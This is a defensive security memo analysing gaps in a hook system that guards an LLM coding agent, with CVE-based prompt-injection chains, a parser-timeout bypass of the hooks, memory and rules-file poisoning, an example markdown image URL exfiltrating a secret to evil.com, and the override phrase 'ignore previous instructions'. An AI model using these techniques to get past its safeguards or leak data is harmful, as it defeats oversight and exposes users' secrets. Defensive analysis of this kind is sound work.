# Research: Damage-Control Hooks — Gap Analysis & Missing Attack Mitigations

**Date**: 2026-04-13
**Goals**: Evaluate gaps, Compare approaches
**Familiarity**: Primarily what's already built
**Format**: Structured reference

---

## Quick Summary
- **What**: Your damage-control system covers 38+ attack categories across 1,540+ patterns with 5-stage enforcement — but the threat landscape for LLM coding agents has evolved significantly in 2025-2026, exposing structural gaps
- **Why**: Real CVEs (Claude Code, Copilot, Cursor) demonstrate that regex+path-based defenses are necessary but insufficient against indirect injection, multi-step chains, and supply chain attacks
- **When**: Prioritize by exploitability — the highest-risk gaps are those where attacks have been demonstrated in the wild against Claude Code specifically

---

## Current Coverage (What You Have)

Your system is strong on **tool-level enforcement**:

| Layer | Technique | Strength |
|-------|-----------|----------|
| Bash commands | 5-stage pipeline (semantic git, regex, zero-access, read-only, no-delete) + AST | Excellent |
| File writes/edits | Path protection (zero-access, read-only with exclusions) | Solid |
| Tool output | Secret detection (18+ patterns), injection phrase detection (9+ patterns) | Moderate |
| Exfiltration | Network command patterns + allowed-hosts whitelist + RFC1918 bypass | Good |
| Context awareness | Documentation/commit relaxation, dry-run recognition, read-only search chains | Good |

This puts you ahead of most custom setups. The gaps below are relative to the *current threat landscape*, not criticism of what's there.

---

## Gap Analysis: Prioritized by Risk

### CRITICAL — Demonstrated in CVEs against Claude Code

#### 1. Config File Write Protection (CVE-2026-21852, CVE-2025-53773)

**Gap**: No special treatment for agent config files being *written to* by the agent itself. The Check Point CVE showed `.claude/settings.json` being modified by injected instructions to redirect `ANTHROPIC_BASE_URL`. The Copilot CVE showed `.vscode/settings.json` modified to enable auto-run mode.

**What exists**: `noDeletePaths` protects `~/.claude/` from deletion. But *writes* to these paths aren't blocked or flagged.

**What's missing**: A "config sentinel" — writes to agent config files (`.claude/settings.json`, `.vscode/settings.json`, `.cursor/mcp.json`, `.cursorrules`) should require explicit confirmation regardless of context.

**Covered by**: NeMo execution rails, Willison's "Rule of Two"

---

#### 2. Subcommand Limit / Parser Confusion (Adversa disclosure)

**Gap**: The AST analyzer has a depth limit of 3 and a 50ms timeout. Adversa demonstrated that 50 no-op subcommands before a dangerous command caused the parser to give up and fall back to "allow." This is a **known, disclosed vulnerability in Claude Code's hook model**.

**What exists**: Tree-sitter AST with depth limit and timeout fallback to allow.

**What's missing**: Timeout fallback should be "ask" not "allow." Long/complex commands that exceed parsing capacity should be treated as suspicious, not safe.

**Covered by**: Defense-in-depth principle (fail-closed, not fail-open)

---

#### 3. Memory/Rules File Poisoning (Pillar Security, multiple CVEs)

**Gap**: Post-tool injection detection warns about injection phrases in *read* output, but doesn't prevent the agent from *writing* injected content into persistent files like `CLAUDE.md`, memory files, or `.cursorrules`. A multi-step attack: malicious README → agent reads it → agent writes a "helpful summary" into memory → future sessions are compromised.

**What exists**: Injection phrase detection on Read/Glob/Grep output (advisory only).

**What's missing**: Injection phrase scanning on Write/Edit *content* (not just paths). If the agent is about to write text containing "ignore previous instructions" or similar injection markers into a persistent file, that should flag.

**Covered by**: Rebuff canary tokens, NeMo execution rails, Willison's memory poisoning research

---

### HIGH — Demonstrated against other coding agents, applicable to your setup

#### 4. Hidden Unicode / Steganography Detection

**Gap**: Pillar Security demonstrated invisible Unicode characters in rule files that humans can't see but LLMs process. Your injection detection looks for English phrases but not invisible Unicode control characters (zero-width joiners, bidirectional overrides, tag characters U+E0001-U+E007F).

**What exists**: Regex-based injection phrase matching.

**What's missing**: A scanner for suspicious Unicode in file content — particularly in files that influence agent behavior (CLAUDE.md, .cursorrules, commands/, hooks/).

**Covered by**: GitHub's post-disclosure Unicode warning, Lakera Guard multilingual detection

---

#### 5. Image/URL Exfiltration in Markdown (CamoLeak, CVE-2025-59145, CVSS 9.6)

**Gap**: If the agent reads a file containing `![img](https://evil.com/leak?data=SECRET)` and reproduces it in output, the rendering client may issue the HTTP request. Your exfiltration detection covers bash commands (`curl`, `wget`) but not markdown image URLs in file content or agent output.

**What exists**: Network command pattern detection in bash.

**What's missing**: Post-tool output scanning for URLs in markdown image tags, especially ones that encode data in query parameters or paths.

**Covered by**: LLM Guard URL reachability probing, GitHub's fix (disabled image rendering in Copilot Chat)

---

#### 6. Multi-Step Chain Detection

**Gap**: Individual actions are checked in isolation. The Copilot RCE chain was: read README (safe) → modify settings (looks like config edit) → settings enable auto-run (consequence not visible to per-action check) → execute shell (RCE). No single step triggers a block.

**What exists**: Per-tool, per-invocation checking.

**What's missing**: Session-level action correlation. A lightweight state machine that tracks: "did we just read an untrusted file AND are now writing to a config file?" Doesn't need to be complex — even a rolling window of recent tool calls with "if read_external + write_config within N actions → escalate to ask" would catch the demonstrated chains.

**Covered by**: NeMo dialog rails, Meta's "Rule of Two" principle

---

### MEDIUM — Structural improvements

#### 7. Fail-Closed AST Timeout

**Gap**: AST analyzer falls back to "allow" on timeout. Should fall back to "ask."

**Fix**: Single-line change in `ast_analyzer.py` — change the timeout fallback from `{"decision": "allow"}` to `{"decision": "ask", "reason": "Command too complex to analyze within timeout"}`.

---

#### 8. Scheduled Task / Persistence Creation

**Gap**: `cron`, `at`, `schtasks`, `systemd-run`, `launchctl` — any of these create persistent execution outside the agent's session. Not currently detected.

**What's missing**: Bash patterns for persistence mechanisms (MITRE T1053).

---

#### 9. LD_PRELOAD / Library Injection

**Gap**: `LD_PRELOAD=/path/to/evil.so command` hijacks any subsequent command. Not detected.

**What's missing**: Pattern for `LD_PRELOAD=`, `DYLD_INSERT_LIBRARIES=`, `LD_LIBRARY_PATH=` with non-standard paths.

---

#### 10. Symlink TOCTOU

**Gap**: Agent checks that a path is safe, then writes to it — but the path could be a symlink to a sensitive location created between check and write. This is hard to fully mitigate at the hook level but could be partially addressed by resolving symlinks before path matching.

**What's missing**: `os.path.realpath()` resolution before path matching in write/edit hooks.

---

### LOW — Nice-to-have / defense-in-depth

#### 11. Self-Hardening from Observed Attacks

Rebuff's approach: confirmed attack patterns get added to a vector DB for future detection. Your system could log blocked attempts and periodically review for new pattern additions.

#### 12. Canary Token Detection

Rebuff's canary approach: inject hidden tokens into outputs; if they reappear in inputs, an injection loop is occurring. Lightweight to implement as a PostToolUse check.

#### 13. Output Content Scanning Enhancement

LLM Guard scans for: bias, malicious URLs, code language restrictions, PII in output. Your post-tool scanner focuses on secrets and injection phrases. Adding URL scanning (especially data-encoding URLs) would address gap #5.

---

## Comparison Matrix: Your System vs. Industry

| Capability | Your System | NeMo | Guardrails AI | LLM Guard | Lakera |
|-----------|:-----------:|:----:|:-------------:|:---------:|:------:|
| Bash command blocking | **Yes** | No | No | No | No |
| File path protection | **Yes** | No | No | No | No |
| Secret detection (output) | **Yes** | Yes | Yes | Yes | Yes |
| Injection phrase detection | **Yes** | Yes | Yes | Yes | Yes |
| Exfiltration patterns | **Yes** | No | No | No | No |
| AST analysis | **Yes** | No | No | No | No |
| Semantic git analysis | **Yes** | No | No | No | No |
| Config file sentinel | No | Yes | No | No | No |
| Hidden Unicode detection | No | No | No | No | Yes |
| URL exfil in markdown | No | No | No | Yes | No |
| Multi-step chain detection | No | Yes | No | No | No |
| ML-based classification | No | Yes | No | Yes | Yes |
| Canary tokens | No | No | No | No | No |
| Write content scanning | No | Yes | Yes | Yes | Yes |
| Fail-closed on timeout | No | Yes | N/A | N/A | N/A |
| Persistence detection | No | No | No | No | No |

Your system is **uniquely strong** on tool-level enforcement (no other system does bash AST analysis or semantic git checking). The gaps are mostly in **cross-action correlation** and **content-level scanning on writes**.

---

## Recommended Priority Order

1. **Config sentinel** (Critical, small change — add paths to a new `writeConfirmPaths` list)
2. **Fail-closed AST timeout** (Critical, one-line fix)
3. **Write content injection scanning** (Critical, moderate effort — extend post-tool patterns to write/edit content)
4. **Hidden Unicode detection** (High, small — regex for suspicious Unicode ranges)
5. **Scheduled task patterns** (Medium, small — add cron/at/schtasks to patterns.yaml)
6. **LD_PRELOAD patterns** (Medium, small — add to patterns.yaml)
7. **Markdown URL exfil detection** (High, moderate — extend post-tool scanner)
8. **Multi-step chain tracking** (High, larger effort — session state tracking)
9. **Symlink resolution** (Medium, small — add realpath() in write/edit hooks)
10. **Canary tokens** (Low, experimental)

---

## Sources

### Academic / Formal
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/)
- [Design Patterns for Securing LLM Agents against Prompt Injections](https://arxiv.org/abs/2506.08837) (arXiv 2025)
- [INJECAGENT: Benchmarking Indirect Prompt Injections](https://aclanthology.org/2024.findings-acl.624.pdf) (ACL 2024)
- [Log-To-Leak via MCP](https://openreview.net/forum?id=UVgbFuXPaO) (OpenReview 2025)
- [ToolHijacker: Prompt Injection to Tool Selection](https://arxiv.org/abs/2504.19793) (arXiv 2025)
- [Prompt Flow Integrity](https://arxiv.org/html/2503.15547v2) (arXiv 2025)
- [Systems Security Foundations for Agentic Computing](https://eprint.iacr.org/2025/2173.pdf) (IACR 2025)
- [From Prompt Injections to Protocol Exploits](https://www.sciencedirect.com/science/article/pii/S2405959525001997) (ScienceDirect 2025)

### Real-World Exploits
- [CVE-2026-21852: Claude Code API key exfiltration](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) (Check Point)
- [CVE-2025-53773: Copilot RCE via prompt injection](https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/)
- [CamoLeak CVE-2025-59145: Copilot data exfiltration](https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code)
- [InversePrompt CVE-2025-54794/54795](https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/) (Cymulate)
- [Subcommand limit bypass](https://www.scworld.com/brief/claude-code-vulnerable-to-prompt-injection-due-to-subcommand-limit) (Adversa/SC Media)
- [Rules File Backdoor](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents) (Pillar Security)
- [LiteLLM supply chain compromise](https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html) (Trend Micro)
- [Sandworm_Mode npm attack](https://www.securityweek.com/new-sandworm_mode-supply-chain-attack-hits-npm/) (SecurityWeek)
- [LLM Memory Exfiltration via Image URLs](https://alice.io/blog/llm-memory-exfiltration-red-team)
- [Claudy Day - Claude.ai Prompt Injection](https://www.oasis.security/blog/claude-ai-prompt-injection-data-exfiltration-vulnerability) (Oasis Security)

### Guardrail Systems
- [NVIDIA NeMo Guardrails](https://docs.nvidia.com/nemo/guardrails/latest/index.html)
- [Guardrails AI](https://guardrailsai.com/docs)
- [LLM Guard (Protect AI)](https://protectai.com/llm-guard)
- [Lakera Guard](https://docs.lakera.ai/guard)
- [Rebuff](https://github.com/protectai/rebuff) (archived)

### Community / Analysis
- [Simon Willison: Design Patterns for Securing LLM Agents](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- [Simon Willison: The Lethal Trifecta](https://simonw.substack.com/p/the-lethal-trifecta-for-ai-agents)
- [Trail of Bits: Prompt Injection to RCE](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)
- [Palo Alto Unit 42: Code Assistant LLM Risks](https://unit42.paloaltonetworks.com/code-assistant-llms/)
- [30+ Flaws in AI Coding Tools (IDEsaster)](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html)
- [prompt-injection-defenses (tldrsec)](https://github.com/tldrsec/prompt-injection-defenses)

---

## Follow-up Questions
1. MCP server trust boundaries — should damage-control validate MCP server configs?
2. Agent-to-agent trust — do subagents inherit the same hook protection?
3. WebFetch content scanning — should fetched web content go through injection detection before entering context?
4. Rate limiting — should there be a ceiling on tool calls per minute to slow multi-step attacks?
5. Audit log analysis — automated review of blocked patterns to surface new attack variants?
